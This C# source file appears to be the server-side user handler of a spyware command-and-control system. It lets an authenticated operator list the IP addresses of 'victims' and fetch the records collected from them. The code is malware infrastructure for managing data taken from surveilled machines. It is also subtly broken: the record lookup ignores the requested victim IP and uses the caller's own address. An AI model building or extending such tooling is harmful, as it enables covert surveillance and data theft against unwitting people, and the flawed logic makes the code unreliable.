
using Server.Data;
using SpyCommunicationLib;
using SpyCommunicationLib.Directors;
using SpyCommunicationLib.Entities;
using System.Net;


namespace Server.Handlers
{
    class UserHandler : IHandler
    {
        private static ServerResponseDirector _director = new ServerResponseDirector();


        public bool CheckConditions(SpyMessage? message)
        {
            if (message == null)
                return false;
            return message._sender == Sender.User;
        }

        private async Task<string> GetVictimIpList(ClientInfo clientInfo)
        {

            if (!clientInfo.IsAuthorized)
                return _director.GetUnauthorizedResponse().ToString();

            List<string> ip_list = Data.RecordsContainer.GetVictimsIps();

            return _director.GetVictimsIpListResponse(ip_list).ToString();
        }

        private async Task<string> GetVictimRecords(string victimIp, ClientInfo clientInfo)
        {
            if (!clientInfo.IsAuthorized)
                return _director.GetUnauthorizedResponse().ToString();

            string ip = clientInfo.RemoteEndPoint.Split(":")[0];
            List<VictimRecord> records = Data.RecordsContainer.GetRecordsByIp(ip);

            return _director.GetVictimRecordsResponse(records).ToString();
        }

        private async Task<string> LoginUser(string username, string password, ClientInfo clientInfo)
        {
            if (username == String.Empty || password == String.Empty)
                return _director.GetUnauthorizedResponse().ToString();

            if (!UsersContainer.UserCheck(username, password))
                return _director.GetUnauthorizedResponse().ToString();

            clientInfo.SetAuthorization(username);
            return _director.GetSuccessResponse().ToString();
        }


        public async Task<string> HandleAsync(SpyMessage? message, ClientInfo clientInfo)
        {
            if (message == null)
                return _director.GetBadRequestResponse().ToString();

            string response;

            switch (message.Action)
            {
                case MessageAction.GetVictimsIpList:
                    response = await GetVictimIpList(clientInfo);
                    break;
                case MessageAction.GetVictimRecords:
                    string victimIp = message.GetOption("victim_ip");
                    response = await GetVictimRecords(victimIp, clientInfo);
                    break;
                case MessageAction.Login:
                    string username = message.GetOption("username");
                    string password = message.GetOption("password");
                    response = await LoginUser(username, password, clientInfo);
                    break;
                default:
                    response = _director.GetNotFoundRequestResponse().ToString(); 
                    break;
            }

            return response;
        }
    }
}
